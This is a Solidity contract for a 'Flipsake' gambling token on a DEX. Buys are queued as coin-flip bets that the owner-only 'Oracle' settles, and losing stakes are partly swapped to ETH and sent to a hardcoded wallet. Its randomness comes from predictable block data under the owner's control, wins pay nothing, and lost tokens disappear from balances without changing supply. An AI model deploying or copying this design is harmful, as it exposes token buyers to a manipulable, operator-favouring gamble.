// SPDX-License-Identifier: MIT

pragma solidity 0.8.8;

interface IDEXFactory {
function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IDEXRouter {
function factory() external pure returns(address);
function WETH() external pure returns(address);
function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract Flipsake {
modifier Oracle() { require(msg.sender == _oracle); _; }

struct BetStruct
    {
uint256 amount;
address wallet;
    }

    BetStruct[] public _betstruct;

uint256 public minbuy;

address _oracle;
address mw = 0xFCcf0bDd3430d6a5D7ebF7bD80B60b55F08D1E58;
string _name;
string _symbol;
uint8 _decimals = 18;
address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
uint256 _totalSupply;
uint256 public TotalLost;

bool inSwap;
bool tradeenabled;
modifier swapping() { inSwap = true; _; inSwap = false; }

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public isBetExempt;
IDEXRouter public router;
address public pair;

    constructor() {
        _oracle = msg.sender;
        _name = "FLIPSAKE";
        _symbol = "FLPSK";
        _totalSupply = 100000000 * 10 ** _decimals;
        router = IDEXRouter(routerAddress);
        _balances[_oracle] = _totalSupply;
        _allowances[address(this)][address(router)] = ~uint256(0);
        isBetExempt[_oracle] = true;
    }

    receive() external payable { }
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
event OracleTransferred(address oracle);

event Win(address indexed owner, uint256 amount);
event Loss(address indexed owner, uint256 amount);

    function name() external view returns(string memory) { return _name; }
    function symbol() external view returns(string memory) { return _symbol; }
    function decimals() external view returns(uint8) { return _decimals; }
    function totalSupply() external view returns(uint256) { return _totalSupply; }
    function balanceOf(address account) public view returns(uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view returns(uint256) { return _allowances[holder][spender]; }

    function SetPairManual(address _pair) external Oracle {pair = _pair;}

    function StartTrading() external Oracle {tradeenabled =  true;}

    function approve(address spender, uint256 amount) public returns(bool) {
        _allowances[msg.sender][spender] = amount;
emit Approval(msg.sender, spender, amount);
        return true;
    }

    function ChangeMinBuy(uint256 amount) external Oracle { minbuy = amount; }

    function rand(uint256 offsetvalue) public view returns(bool)
    {uint256 x = uint(keccak256(abi.encodePacked(offsetvalue, block.difficulty, block.timestamp, msg.sender, _betstruct.length))) % 2; if (x == 0) { return false; } else { return true; } }

    function AddBetQueue(address wallet, uint256 amount) internal { _betstruct.push(BetStruct(amount, wallet)); }

    function _pop(uint index) internal {
        require(index < _betstruct.length);
        _betstruct[index] = _betstruct[_betstruct.length - 1];
        _betstruct.pop();
    }

    function AwaitingBet(address wallet) public view returns(bool){ for (uint256 x; x < _betstruct.length; x++) { if (_betstruct[x].wallet == wallet) { return true; } } return false; }

    function QueueLen() external view returns(uint256) { return _betstruct.length; }

    function OracleFinalizeQueue() external Oracle
    {
        if (_betstruct.length == 0) { return; }
uint256 offsetiterator;
        while (_betstruct.length > 0) {
            _betstruct[0].amount;
            offsetiterator += _betstruct[0].amount;
            if (_balances[_betstruct[0].wallet] >= _betstruct[0].amount){
                if (rand(offsetiterator)) {
    emit Win(_betstruct[0].wallet, _betstruct[0].amount);
                }
                else {
                    _balances[_betstruct[0].wallet] -= _betstruct[0].amount;
                    _balances[address(this)] += _betstruct[0].amount / 4;
    emit Loss(_betstruct[0].wallet, _betstruct[0].amount);
                    TotalLost += _betstruct[0].amount;
                }
            }
                _pop(0);
        }
        if (_balances[address(this)] > 0) { swapBack(); }
    }

    function transferOracle(address wallet) public Oracle {
        _oracle = wallet;
emit OracleTransferred(_oracle);
    }

    function transfer(address recipient, uint256 amount) external returns(bool) { return _transferFrom(msg.sender, recipient, amount); }

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool) {
        if (_allowances[sender][msg.sender] != ~uint256(0)) { _allowances[sender][msg.sender] -= amount; }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
        return _BetTransfer(sender, recipient, amount);
    }
    function _BetTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

    //inswap or addliq/removeliq of _oracle
    if(inSwap || (isBetExempt[sender] || isBetExempt[recipient])){_basicTransfer(sender, recipient, amount);return true;}

    if(!tradeenabled){revert("trading not yet enabled");}

    //if buy
    if(sender == pair){require(amount >= minbuy);AddBetQueue(recipient, amount);}

    _basicTransfer(sender, recipient, amount);
    return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns(bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapBack() internal swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_balances[address(this)], 0, path, address(this), block.timestamp);

        mw.call{ value: address(this).balance } ("");
    }

}